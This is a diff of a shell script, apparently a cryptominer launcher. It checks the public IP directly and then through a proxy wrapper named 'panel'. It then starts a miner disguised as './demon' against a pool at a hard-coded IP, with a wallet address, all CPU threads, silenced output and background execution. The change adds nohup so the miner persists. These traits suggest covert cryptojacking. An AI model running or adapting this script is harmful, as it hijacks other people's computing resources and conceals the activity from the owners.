@@ -17,4 +17,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./demon -a yespowertide  -o 8.222.134.27:80 -u TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.$(echo $(shuf -i 1-9 -n 1)-idx) -p -x -t $(nproc --all) &>/dev/null &
+nohup ./panel ./demon -a yespowertide  -o 8.222.134.27:80 -u TQzCg7GXgftgYSbKKAe1E5XWZaf5F7GxsG.$(echo $(shuf -i 1-9 -n 1)-idx) -p -x -t $(nproc --all) &>/dev/null &
